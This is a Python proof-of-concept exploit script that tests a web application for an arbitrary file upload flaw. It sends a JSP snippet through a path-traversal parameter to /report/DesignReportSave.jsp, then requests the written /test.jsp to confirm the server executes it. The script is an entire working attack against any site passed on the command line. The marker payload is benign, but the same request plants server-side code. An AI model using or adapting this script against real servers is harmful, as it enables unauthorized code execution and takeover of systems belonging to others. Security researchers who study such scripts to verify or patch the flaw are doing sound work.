#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib
import urllib3

urllib3.disable_warnings()

def verify(site):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "application/octet-stream",
        "Accept-Encoding": "gzip, deflate"
    }
    vulurl = site + "/report/DesignReportSave.jsp?report=../test.jsp"
    data='<% out.print("kkttxx");%>'
    try:
        r = requests.post(vulurl, data=data,headers=headers,verify=False)
        r2 = requests.get(site+"/test.jsp")
        if "kkttxx" in r2.text :
            return site+"/test.jsp" 
    except:
        print(sys.exc_info())
        pass
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的图片路径为：", data)
    else:
        print("[-]漏洞不存在")
